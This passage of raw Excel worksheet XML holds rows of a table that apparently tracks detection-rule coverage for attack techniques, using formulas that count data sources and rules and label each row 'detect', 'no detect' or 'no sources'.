        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S32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29" t="s">
        <v>1348</v>
      </c>
      <c r="U329" t="s">
        <v>1673</v>
      </c>
      <c r="V329" t="s">
        <v>1674</v>
      </c>
      <c r="W329" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="330" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A330" t="s">
        <v>1675</v>
      </c>
      <c r="B330" t="s">
        <v>1675</v>
      </c>
      <c r="C330" t="s">
        <v>84</v>
      </c>
      <c r="D330" t="s">
        <v>8</v>
      </c>
      <c r="E330" t="s">
        <v>1676</v>
      </c>
      <c r="F330" s="9">
        <f t="shared" si="5"/>
        <v>2</v>
      </c>
      <c r="G330" s="9" cm="1">
        <f t="array" ref="G330">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H330" s="9" cm="1">
        <f t="array" ref="H330">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I330" s="9" t="str" cm="1">
        <f t="array" ref="I330">IF(SUM(IF($C330=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C330=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J330" s="9" t="str" cm="1">
        <f t="array" ref="J33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30" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M330" s="9" cm="1">
        <f t="array" ref="M330">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N330" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O330" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P330" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S33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30" t="s">
        <v>517</v>
      </c>
      <c r="U330" t="s">
        <v>1677</v>
      </c>
      <c r="V330" t="s">
        <v>1678</v>
      </c>
      <c r="W330" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="331" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A331" t="s">
        <v>1679</v>
      </c>
      <c r="B331" t="s">
        <v>1679</v>
      </c>
      <c r="C331" t="s">
        <v>153</v>
      </c>
      <c r="D331" t="s">
        <v>7</v>
      </c>
      <c r="E331" t="s">
        <v>1680</v>
      </c>
      <c r="F331" s="9">
        <f t="shared" si="5"/>
        <v>2</v>
      </c>
      <c r="G331" s="9" cm="1">
        <f t="array" ref="G331">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H331" s="9" cm="1">
        <f t="array" ref="H331">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I331" s="9" t="str" cm="1">
        <f t="array" ref="I331">IF(SUM(IF($C331=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C331=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J331" s="9" t="str" cm="1">
        <f t="array" ref="J33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31" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M331" s="9" cm="1">
        <f t="array" ref="M331">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N331" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O331" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P331" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S33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31" t="s">
        <v>1681</v>
      </c>
      <c r="U331" t="s">
        <v>1682</v>
      </c>
      <c r="V331" t="s">
        <v>1683</v>
      </c>
      <c r="W331" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="332" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A332" t="s">
        <v>1684</v>
      </c>
      <c r="B332" t="s">
        <v>1684</v>
      </c>
      <c r="C332" t="s">
        <v>164</v>
      </c>
      <c r="D332" t="s">
        <v>13</v>
      </c>
      <c r="E332" t="s">
        <v>1685</v>
      </c>
      <c r="F332" s="9">
        <f t="shared" si="5"/>
        <v>3</v>
      </c>
      <c r="G332" s="9" cm="1">
        <f t="array" ref="G332">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H332" s="9" cm="1">
        <f t="array" ref="H332">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I332" s="9" t="str" cm="1">
        <f t="array" ref="I332">IF(SUM(IF($C332=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C332=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J332" s="9" t="str" cm="1">
        <f t="array" ref="J33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32" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M332" s="9" cm="1">
        <f t="array" ref="M332">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N332" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O332" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P332" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S33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32" t="s">
        <v>425</v>
      </c>
      <c r="U332" t="s">
        <v>1686</v>
      </c>
      <c r="V332" t="s">
        <v>1687</v>
      </c>
      <c r="W332" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="333" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A333" t="s">
        <v>1688</v>
      </c>
      <c r="B333" t="s">
        <v>1688</v>
      </c>
      <c r="C333" t="s">
        <v>111</v>
      </c>
      <c r="D333" t="s">
        <v>10</v>
      </c>
      <c r="E333" t="s">
        <v>1689</v>
      </c>
      <c r="F333" s="9">
        <f t="shared" si="5"/>
        <v>2</v>
      </c>
      <c r="G333" s="9" cm="1">
        <f t="array" ref="G333">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H333" s="9" cm="1">
        <f t="array" ref="H333">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I333" s="9" t="str" cm="1">
        <f t="array" ref="I333">IF(SUM(IF($C333=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C333=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J333" s="9" t="str" cm="1">
        <f t="array" ref="J33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33" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M333" s="9" cm="1">
        <f t="array" ref="M333">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N333" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O333" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P333" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S33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33" t="s">
        <v>1690</v>
      </c>
      <c r="U333" t="s">
        <v>1691</v>
      </c>
      <c r="V333" t="s">
        <v>1692</v>
      </c>
      <c r="W333" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="334" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A334" t="s">
        <v>1693</v>
      </c>
      <c r="B334" t="s">
        <v>1693</v>
      </c>
      <c r="C334" t="s">
        <v>25</v>
      </c>
      <c r="D334" t="s">
        <v>13</v>
      </c>
      <c r="E334" t="s">
        <v>1694</v>
      </c>
      <c r="F334" s="9">
        <f t="shared" si="5"/>
        <v>3</v>
      </c>
      <c r="G334" s="9" cm="1">
        <f t="array" ref="G334">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H334" s="9" cm="1">
        <f t="array" ref="H334">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I334" s="9" t="str" cm="1">
        <f t="array" ref="I334">IF(SUM(IF($C334=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C334=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J334" s="9" t="str" cm="1">
        <f t="array" ref="J33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34" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M334" s="9" cm="1">
        <f t="array" ref="M334">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N334" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O334" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P334" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S33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34" t="s">
        <v>1165</v>
      </c>
      <c r="U334" t="s">
        <v>1695</v>
      </c>
      <c r="V334" t="s">
        <v>1696</v>
      </c>
      <c r="W334" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="335" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A335" t="s">
        <v>1697</v>
      </c>
      <c r="B335" t="s">
        <v>1697</v>
      </c>
      <c r="C335" t="s">
        <v>34</v>
      </c>
      <c r="D335" t="s">
        <v>9</v>
      </c>
      <c r="E335" t="s">
        <v>1698</v>
      </c>
      <c r="F335" s="9">
        <f t="shared" si="5"/>
        <v>3</v>
      </c>
      <c r="G335" s="9" cm="1">
        <f t="array" ref="G335">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H335" s="9" cm="1">
        <f t="array" ref="H335">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I335" s="9" t="str" cm="1">
        <f t="array" ref="I335">IF(SUM(IF($C335=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C335=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J335" s="9" t="str" cm="1">
        <f t="array" ref="J33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35" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M335" s="9" cm="1">
        <f t="array" ref="M335">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N335" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O335" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P335" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S33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35" t="s">
        <v>999</v>
      </c>
      <c r="U335" t="s">
        <v>1699</v>
      </c>
      <c r="V335" t="s">
        <v>1700</v>
      </c>
      <c r="W335" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="336" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A336" t="s">
        <v>1701</v>
      </c>
      <c r="B336" t="s">
        <v>1701</v>
      </c>
      <c r="C336" t="s">
        <v>214</v>
      </c>
      <c r="D336" t="s">
        <v>6</v>
      </c>
      <c r="E336" t="s">
        <v>1702</v>
      </c>
      <c r="F336" s="9">
        <f t="shared" si="5"/>
        <v>2</v>
      </c>
      <c r="G336" s="9" cm="1">
        <f t="array" ref="G336">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H336" s="9" cm="1">
        <f t="array" ref="H336">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I336" s="9" t="str" cm="1">
        <f t="array" ref="I336">IF(SUM(IF($C336=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C336=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J336" s="9" t="str" cm="1">
        <f t="array" ref="J33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36" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M336" s="9" cm="1">
        <f t="array" ref="M336">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N336" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O336" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P336" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S33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36" t="s">
        <v>520</v>
      </c>
      <c r="U336" t="s">
        <v>1703</v>
      </c>
      <c r="V336" t="s">
        <v>1704</v>
      </c>
      <c r="W336" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="337" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A337" t="s">
        <v>1705</v>
      </c>
      <c r="B337" t="s">
        <v>1705</v>
      </c>
      <c r="C337" t="s">
        <v>123</v>
      </c>
      <c r="D337" t="s">
        <v>12</v>
      </c>
      <c r="E337" t="s">
        <v>1706</v>
      </c>
      <c r="F337" s="9">
        <f t="shared" si="5"/>
        <v>8</v>
      </c>
      <c r="G337" s="9" cm="1">
        <f t="array" ref="G337">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H337" s="9" cm="1">
        <f t="array" ref="H337">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I337" s="9" t="str" cm="1">
        <f t="array" ref="I337">IF(SUM(IF($C337=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C337=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J337" s="9" t="str" cm="1">
        <f t="array" ref="J33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37" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M337" s="9" cm="1">
        <f t="array" ref="M337">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N337" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O337" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P337" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S33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37" t="s">
        <v>1690</v>
      </c>
      <c r="U337" t="s">
        <v>1707</v>
      </c>
      <c r="V337" t="s">
        <v>1708</v>
      </c>
      <c r="W337" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="338" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A338" t="s">
        <v>1709</v>
      </c>
      <c r="B338" t="s">
        <v>1709</v>
      </c>
      <c r="C338" t="s">
        <v>70</v>
      </c>
      <c r="D338" t="s">
        <v>8</v>
      </c>
      <c r="E338" t="s">
        <v>984</v>
      </c>
      <c r="F338" s="9">
        <f t="shared" si="5"/>
        <v>2</v>
      </c>
      <c r="G338" s="9" cm="1">
        <f t="array" ref="G338">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H338" s="9" cm="1">
        <f t="array" ref="H338">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I338" s="9" t="str" cm="1">
        <f t="array" ref="I338">IF(SUM(IF($C338=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C338=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J338" s="9" t="str" cm="1">
        <f t="array" ref="J33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38" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M338" s="9" cm="1">
        <f t="array" ref="M338">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N338" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O338" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P338" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S33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38" t="s">
        <v>517</v>
      </c>
      <c r="U338" t="s">
        <v>1710</v>
      </c>
      <c r="V338" t="s">
        <v>1711</v>
      </c>
      <c r="W338" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="339" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A339" t="s">
        <v>1712</v>
      </c>
      <c r="B339" t="s">
        <v>1712</v>
      </c>
      <c r="C339" t="s">
        <v>160</v>
      </c>
      <c r="D339" t="s">
        <v>7</v>
      </c>
      <c r="E339" t="s">
        <v>1713</v>
      </c>
      <c r="F339" s="9">
        <f t="shared" si="5"/>
        <v>2</v>
      </c>
      <c r="G339" s="9" cm="1">
        <f t="array" ref="G339">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H339" s="9" cm="1">
        <f t="array" ref="H339">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I339" s="9" t="str" cm="1">
